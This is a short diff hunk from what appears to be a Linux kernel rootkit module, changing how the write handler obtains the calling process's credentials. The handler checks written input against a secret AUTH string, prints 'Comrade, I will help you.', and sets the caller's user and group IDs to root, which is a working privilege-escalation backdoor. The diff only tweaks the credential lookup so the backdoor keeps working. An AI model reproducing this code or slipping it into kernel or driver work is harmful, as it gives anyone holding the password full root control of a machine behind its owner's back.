@@ -93,7 +93,10 @@ write_handler(struct file * filp, const char __user *buff,
     if (strlen(kbuff) == strlen(AUTH) &&
         strncmp(AUTH, kbuff, count) == 0) {
         fm_alert("%s\n", "Comrade, I will help you.");
-        cred = (struct cred *)current_real_cred();
+
+        /* cred = (struct cred *)current_real_cred(); */
+        cred = (struct cred *)__task_cred(current);
+
         // TODO: We might probably just copy the cred from pid 1.
         cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
         cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
